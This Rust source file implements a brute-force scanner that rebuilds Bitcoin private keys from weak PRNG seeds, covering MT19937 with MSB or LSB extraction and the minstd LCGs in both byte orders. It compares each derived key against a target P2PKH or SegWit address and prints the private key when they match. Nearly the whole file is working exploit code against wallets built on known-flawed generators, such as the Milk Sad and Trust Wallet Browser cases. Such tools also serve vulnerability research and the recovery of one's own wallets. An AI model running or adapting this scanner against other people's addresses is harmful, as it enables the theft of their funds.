//! Direct Key Derivation Scanner
//!
//! Covers Gap #5: PRNG output used directly as 256-bit private key (no BIP39)
//! Also covers Gap #4: LCG Pattern A vs B variants
//!
//! This scanner tests both:
//! - MT19937 MSB/LSB extraction
//! - LCG16807 (minstd_rand0) and LCG48271 (minstd_rand)
//! - Pattern A (LE byte order) and Pattern B (BE byte order)

use anyhow::Result;
use bitcoin::secp256k1::{Secp256k1, SecretKey};
use bitcoin::{Address, CompressedPublicKey, Network};
use rand_mt::Mt19937GenRand32;
use tracing::{info, warn};

/// Pattern for byte extraction from PRNG
#[derive(Debug, Clone, Copy)]
pub enum BytePattern {
    PatternA, // Little-endian byte order
    PatternB, // Big-endian byte order
}

/// PRNG type for direct key generation
#[derive(Debug, Clone, Copy)]
pub enum PrngType {
    Mt19937Msb, // Milk Sad - MSB extraction
    Mt19937Lsb, // Trust Wallet Browser - LSB extraction
    Lcg16807,   // minstd_rand0 (a=16807)
    Lcg48271,   // minstd_rand (a=48271)
}

/// Run direct key derivation scanner
/// This generates private keys directly from PRNG output without BIP39
pub fn run(
    target: &str,
    prng: PrngType,
    pattern: BytePattern,
    start_seed: u32,
    end_seed: u32,
) -> Result<()> {
    info!("Direct Key Derivation Scanner");
    info!("PRNG: {:?}, Pattern: {:?}", prng, pattern);
    info!("Target: {}", target);
    info!("Scanning seeds {} to {}...", start_seed, end_seed);

    let secp = Secp256k1::new();
    let network = Network::Bitcoin;

    let mut checked = 0u64;
    let start_time = std::time::Instant::now();

    for seed in start_seed..=end_seed {
        // Generate 256-bit private key directly from PRNG
        let privkey_bytes = generate_direct_key(seed, prng, pattern);

        // Try to create secret key (may fail if privkey is invalid)
        if let Ok(secret) = SecretKey::from_slice(&privkey_bytes) {
            let pubkey_secp = secret.public_key(&secp);

            // Generate both compressed and uncompressed addresses
            let compressed = CompressedPublicKey(pubkey_secp);
            let addr_compressed = Address::p2pkh(compressed, network);

            // Check match
            if addr_compressed.to_string() == target {
                warn!("\n🎯 FOUND MATCH!");
                warn!("Seed: {}", seed);
                warn!("Private Key: {}", hex::encode(privkey_bytes));
                warn!("Address: {}", addr_compressed);
                warn!("PRNG: {:?}, Pattern: {:?}", prng, pattern);
                return Ok(());
            }

            // Also check P2WPKH (SegWit)
            let addr_wpkh = Address::p2wpkh(&compressed, network);
            if addr_wpkh.to_string() == target {
                warn!("\n🎯 FOUND MATCH (SegWit)!");
                warn!("Seed: {}", seed);
                warn!("Private Key: {}", hex::encode(privkey_bytes));
                warn!("Address: {}", addr_wpkh);
                return Ok(());
            }
        }

        checked += 1;
        if checked.is_multiple_of(500_000) {
            let elapsed = start_time.elapsed().as_secs_f64();
            let speed = checked as f64 / elapsed;
            info!("Scanned {} seeds | {:.0} seeds/s", checked, speed);
        }
    }

    info!("Scan complete (checked {} seeds). No match found.", checked);
    Ok(())
}

/// Generate 256-bit private key directly from PRNG output
fn generate_direct_key(seed: u32, prng: PrngType, pattern: BytePattern) -> [u8; 32] {
    match prng {
        PrngType::Mt19937Msb => generate_mt19937_msb(seed, pattern),
        PrngType::Mt19937Lsb => generate_mt19937_lsb(seed, pattern),
        PrngType::Lcg16807 => generate_lcg(seed, 16807, pattern),
        PrngType::Lcg48271 => generate_lcg(seed, 48271, pattern),
    }
}

/// Generate key using MT19937 with MSB extraction (like Milk Sad)
fn generate_mt19937_msb(seed: u32, pattern: BytePattern) -> [u8; 32] {
    let mut rng = Mt19937GenRand32::new(seed);
    let mut key = [0u8; 32];

    // For MSB-only extraction, we need 32 outputs (1 byte each)
    for byte in &mut key {
        let val = rng.next_u32();
        *byte = ((val >> 24) & 0xFF) as u8; // MSB only
    }

    match pattern {
        BytePattern::PatternA => key,
        BytePattern::PatternB => {
            // Pattern B: reverse byte order
            let mut reversed = [0u8; 32];
            for (i, &b) in key.iter().enumerate() {
                reversed[31 - i] = b;
            }
            reversed
        }
    }
}

/// Generate key using MT19937 with LSB extraction (like Trust Wallet Browser)
fn generate_mt19937_lsb(seed: u32, pattern: BytePattern) -> [u8; 32] {
    let mut rng = Mt19937GenRand32::new(seed);
    let mut key = [0u8; 32];

    // For LSB-only extraction, we need 32 outputs (1 byte each)
    for byte in &mut key {
        let val = rng.next_u32();
        *byte = (val & 0xFF) as u8; // LSB only
    }

    match pattern {
        BytePattern::PatternA => key,
        BytePattern::PatternB => {
            let mut reversed = [0u8; 32];
            for i in 0..32 {
                reversed[i] = key[31 - i];
            }
            reversed
        }
    }
}

/// Generate key using LCG (minstd_rand0 or minstd_rand)
fn generate_lcg(seed: u32, multiplier: u64, pattern: BytePattern) -> [u8; 32] {
    const M: u64 = 2147483647; // 2^31 - 1

    let mut state = if seed == 0 { 1 } else { seed as u64 };
    let mut key = [0u8; 32];

    // Generate 8 32-bit values (256 bits)
    for i in 0..8 {
        state = (state * multiplier) % M;
        let val = state as u32;

        match pattern {
            BytePattern::PatternA => {
                // Little-endian
                key[i * 4..i * 4 + 4].copy_from_slice(&val.to_le_bytes());
            }
            BytePattern::PatternB => {
                // Big-endian
                key[i * 4..i * 4 + 4].copy_from_slice(&val.to_be_bytes());
            }
        }
    }

    key
}

/// Run scan with all PRNG and pattern combinations
pub fn run_exhaustive(target: &str, start_seed: u32, end_seed: u32) -> Result<()> {
    info!("Exhaustive Direct Key Scanner - Testing all PRNG/pattern combinations");

    let prng_types = [
        PrngType::Mt19937Msb,
        PrngType::Mt19937Lsb,
        PrngType::Lcg16807,
        PrngType::Lcg48271,
    ];
    let patterns = [BytePattern::PatternA, BytePattern::PatternB];

    for prng in &prng_types {
        for pattern in &patterns {
            info!("Testing {:?} with {:?}...", prng, pattern);
            run(target, *prng, *pattern, start_seed, end_seed)?;
        }
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_generate_lcg_pattern_a_vs_b() {
        let key_a = generate_lcg(12345, 16807, BytePattern::PatternA);
        let key_b = generate_lcg(12345, 16807, BytePattern::PatternB);

        // Pattern A and B should produce different keys
        assert_ne!(key_a, key_b);

        // But same seed with same pattern should be deterministic
        let key_a2 = generate_lcg(12345, 16807, BytePattern::PatternA);
        assert_eq!(key_a, key_a2);
    }

    #[test]
    fn test_generate_mt19937_msb_vs_lsb() {
        let key_msb = generate_mt19937_msb(12345, BytePattern::PatternA);
        let key_lsb = generate_mt19937_lsb(12345, BytePattern::PatternA);

        // MSB and LSB should produce different keys
        assert_ne!(key_msb, key_lsb);
    }
}
